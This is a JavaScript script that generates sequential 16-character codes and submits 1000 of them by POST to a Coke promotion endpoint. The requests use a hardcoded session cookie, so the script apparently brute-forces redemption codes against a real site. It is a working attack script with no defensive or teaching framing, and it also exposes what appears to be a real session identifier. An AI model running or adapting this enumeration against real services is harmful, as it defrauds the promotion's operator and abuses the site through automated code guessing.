String.prototype.replaceAt=function(index, replacement) {
  return this.substr(0, index) + replacement+ this.substr(index + replacement.length);
}

var getNext16Code = function(num) {
  for(let i=num.length-1;i>=0 && num[0] !== "Z";i--) {
    let character = num[i];
    if(character === '9') {
      num = num.replaceAt(i, "A");
      return num;
    }
    else if(character === 'Z') {
      num = num.replaceAt(i, "0");
    }
    else {
      let newChar = String.fromCharCode(character.charCodeAt()+1);
      num = num.replaceAt(i, newChar);
      return num;
    }
  }
}

var myHeaders = new Headers();
myHeaders.append('Cookie', 'PHPSESSID=l3uvr7vhqa6ink28p4k6slo79fgcod7g; AKA_A2=A; _ga=GA1.2.1351309394.1572269510; _gid=GA1.2.810235431.1572269510; __cds_pixel_id=f55ae9ff-452b-5769-9f77-095feb28a983; _gat_UA-130301066-1=1; _gat_UA-39427502-1=1; _ga=GA1.2.1351309394.1572269510; _gid=GA1.2.810235431.1572269510; __cds_pixel_id=f55ae9ff-452b-5769-9f77-095feb28a983');

var myRequest = new Request('https://www.coke2home.com/cb/update-ko-code');
let codeTemp = '0000000000000000'
for(let i=0;i<1000;i++) {
  let code = getNext16Code(codeTemp);
  let formData = new FormData();
  formData.append('koCode', code);
  let myInit = {
    method: 'POST',
    headers: myHeaders,
    // mode: 'cors',
    // cache: 'default'
    body: formData,
  };
  fetch(myRequest, myInit).then(res => res.json()).then((response) => {
    console.log(response, code);
  });
  codeTemp = code;
}
